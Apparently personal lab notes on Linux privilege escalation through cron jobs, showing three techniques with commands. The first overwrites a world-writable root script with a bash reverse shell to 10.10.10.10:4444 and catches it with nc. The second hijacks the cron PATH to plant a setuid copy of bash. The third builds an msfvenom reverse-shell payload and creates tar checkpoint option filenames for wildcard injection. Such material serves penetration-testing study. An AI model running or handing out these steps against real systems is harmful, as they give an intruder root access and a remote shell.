# Cron Jobs

### File Permissions

if a script is there that runs as root and has write access we can use it to earn a reverse shell.

e.g. we have this crontab:

```
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

```shell-session
$ locate overwrite.sh
/usr/local/bin/overwrite.sh
$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 42 Aug 17 07:50 /usr/local/bin/overwrite.sh
$ echo '#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > /usr/local/bin/overwrite.sh
```

now we run a `nc -lnvp 4444` in a terminal and we catch a reverse shell after a little while.

### PATH Environment Variable

in the cron tabe bote that the PATH variable starts with /home/user which is our user's home directory.

so we make a file with that name there and it should run it instead of the real overwrite.sh:

```shell-session
$ cd && touch overwrite.sh
$ echo '#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash' > overwrite.sh
$ chmod +x /home/user/overwrite.sh
$ # wait a little while for the cron tab to run
$ /tmp/rootbash -p
```

### Wildcards

the other script in the crontab has this content:

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

Note that the tar command is being run with a wildcard (\*) in your home directory.

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

in the GTFOBins page we see `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`&#x20;

we create a payload with `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf` and upload it to the target machine. then make it executable with `chmod +x /home/user/shell.elf`.

now inspired by the GTFOBins command we make these two files:`touch /home/user/--checkpoint=1 touch /home/user/--checkpoint-action=exec=shell.elf`

When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

then we listen for the reverse shell to arive to out machine.
